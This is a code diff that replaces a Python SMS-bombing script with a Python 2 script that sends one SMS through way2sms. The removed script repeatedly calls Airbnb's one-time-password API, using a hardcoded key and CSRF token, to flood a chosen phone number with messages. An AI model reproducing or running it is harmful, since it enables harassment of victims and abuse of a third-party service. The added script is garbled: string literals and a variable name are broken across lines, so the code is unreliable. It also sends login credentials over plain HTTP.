@@ -1,120 +1,37 @@
-import urllib.request
-import json
-import requests
-import os
-import urllib
+#!/usr/bin/python
+import urllib2
+import cookielib
+from getpass import getpass
 import sys
-import time
-
-os.system('clear')
-
-bar = "\033[1;33;40m\n_________________________________________________\n"
-name = ""
-
-
-
-print("\033[0;36m "" ///////       ////    ////   ////////               ////////////   //////////  //////////  //")
-print("\033[0;36m "" //           // //  // //    //                          //        //      //  //      //  //")                                                 
-print("\033[0;36m "" //          //   //   //     //                          //        //      //  //      //  //")
-print("\033[0;36m "" ///////    //        //      ////////                    //        //      //  //      //  //")                                                              
-print("\033[0;36m ""      //   //        //             //                    //        //      //  //      //  //")                                                           
-print("\033[0;36m ""      //  //        //              //                    //        //      //  //      //  //")                                                                     
-print("\033[0;36m "" /////// //        //         ////////                    //        //////////  //////////  //////////")
-print("\033[0;35m ""                                          [TOOL BY MEGARUN] ")
-print("")
-print("\033[1;33m ""#YOU CAN SEND 10 MESSAGE ONLY ONE NUMBER")
-print("\033[0;32m ""#OUT PUT = 200  message was sent successfully")
-print("\033[1;31m ""#OUT PUT = 400  LIMITED ")
-print("")
-print("")
-
-number = int(input("\033[1;37m""@ Enter phone number with international format (94xxxxxxxxx) - "))
-
-
-def main():
-    os.system("clear")
-    print("\n\n") 
-    s = int(input("\033[1;0;40mEnter Amount - "))
-
-
-
-    url = "https://www.airbnb.com/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=en"
+username = raw_input("Enter Username: ")
+passwd = getpass()
+message = raw_input("Enter Message: ")
+number = raw_input("Enter Mobile number:
+ ")
+mes
+sage = "+".join(message.split(' '))
+#Logging into the SMS Site
+url = 'http://site24.way2sms.com/Login1.action?'
+data = 'username='+username+'&password='+passwd+'&Submit=Sign+in'
+#For Cookies:
+cj = cookielib.CookieJar()
+opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+# Adding Header detail:
+opener.addheaders = [('User-Agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36')]
+try:
+    usock = opener.open(url, data)
+except IOError:
+    print "Error while logging in."
+    sys.exit(1)
+jession_id = str(cj).split('~')[1].split(' ')[0]
+send_sms_url = 'http://site24.way2sms.com/smstoss.action?'
+send_sms_data = 'ssaction=ss&Token='+jession_id+'&mobile='+number+'&message='+message+'&msgLen=136'
+opener.addheaders = [('Referer', 'http://site25.way2sms.com/sendSMS?Token='+jession_id)]
+try:
+    sms_sent_page = opener.open(send_sms_url,send_sms_data)
+except IOError:
+    print "Error while sending messag
+e"
     
-
-    headers = {
-    "accept": "application/json, text/javascript, */*; q=0.01",
-    "accept-encoding": "gzip, deflate, br",
-    "accept-language": "en-US,en;q=0.9,si;q=0.8",
-    "cache-control": "no-cache",
-    "content-length":"81",
-    "content-type":  "application/json",
-    "device-memory": "4",
-    "dpr": "1",
-    "ect": "4g",
-    "origin": "https://www.airbnb.com",
-    "referer": "https://www.airbnb.com/",
-    "sec-fetch-dest": "empty",
-    "sec-fetch-mode": "cors",
-    "sec-fetch-site": "same-origin",
-    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
-    "viewport-width": "811",
-    "x-csrf-token": "V4$.airbnb.com$2b6lgizn2c8$_YXxw_npUQGCUwtRNBIIGBa7dhCZoLqPs7ewu6tF-YU=",
-    "x-csrf-without-token": "1",
-    "x-requested-with": "XMLHttpRequest",
-
-    }    
-
-    params = {
-    "currency": "USD",
-    "key": "d306zoyjsyarp7ifhu67rjxn52tv0t20",
-    "locale": "en",
-    
-    }    
-    payload = {
-    "otpMethod": "AUTO",
-    "phoneNumber": number,
-    "workFlow": "GLOBAL_SIGNUP_LOGIN",
-    }
-
-    ss = 0
-    while s > ss:
-        os.system("clear")
-        print(name)
-        size = 0
-        r = requests.post(url, data=json.dumps(payload), headers=headers)
-        resp = str(r)
-        if resp == '<Response [200]>':
-            print("200 success")
-        elif resp == '<Response [400]>':
-            print("400  limited")
-        else:
-            print("\033[1;31m ""something wrong please try again")
-
-        ss+=1
-        print("\033[1;0;40m\n",str(ss), end="")
-        for i in range(180):
-            
-            pr = i/180*100
-            print("\033[1;36;40m\n>>>",str(int(pr)) +"% ",end="")
-            
-            time.sleep(0.002)
-            sys.stdout.write("\033[F")
-
-
-    os.system('')
-    again()
-
-
-def again():
-    again = input(' (y/n) - ')
-    if again == "y" or again == "Y":
-        os.execl(sys.executable, sys.executable, * sys.argv)
-    elif again == "n" or again == "N":
-        quit()
-    else:
-        print('\033[1;31;40mEnter valid letter')
-        again()
-
-
-if __name__ == "__main__":
-    main()
+sys.exit(1)
+print "SMS has been sent."
